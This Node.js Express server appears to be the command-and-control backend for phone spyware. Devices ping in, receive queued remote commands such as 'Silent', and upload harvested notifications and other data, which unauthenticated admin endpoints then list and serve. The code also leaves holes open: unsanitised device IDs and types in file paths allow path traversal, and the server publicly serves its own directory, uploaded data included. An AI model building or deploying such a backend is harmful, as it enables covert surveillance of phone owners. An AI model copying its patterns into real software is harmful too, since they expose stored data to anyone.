const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Global object sabhi devices ka data aur commands store karne ke liye
let devices = {}; 

// ==================================================
// 📲 PHONE SIDE (App se data aana)
// ==================================================

app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version, charging } = req.body; 
    
    // Agar app se ID nahi aayi toh process na karein
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    // 1. Purana command dhoondo (agar koi pending hai)
    const pendingCommand = (devices[device_id] && devices[device_id].command) ? devices[device_id].command : "none";

    // 2. Device ka naya data update karo
    devices[device_id] = {
        id: device_id,
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "none" // Command bhejte hi server se clear kar do
    };

    console.log(`📡 Ping from ID: ${device_id} | Battery: ${battery}% | Cmd Sent: ${pendingCommand}`);
    
    // App ko command bhej do (Silent/Normal etc.)
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    console.log(`📥 Data Received: [${type}] from ${device_id}`);

    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    try {
        let finalData;
        if (type === 'notifications') {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];
            existingData.unshift(parsedData); 
            finalData = existingData.slice(0, 100);
        } else {
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) {
        console.error("Save Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (Admin Panel)
// ==================================================

// Dashboard ko saare devices ki list dikhane ke liye
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devices);
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;

    if (!devices[device_id]) {
        // Agar device abhi tak ping nahi kiya toh temporary memory banao
        devices[device_id] = { id: device_id };
    }
    
    devices[device_id].command = command;
    console.log(`🚀 Command [${command}] queued for ID: ${device_id}`);
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const { device_id, type } = req.params;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); 
    }
});

app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
});
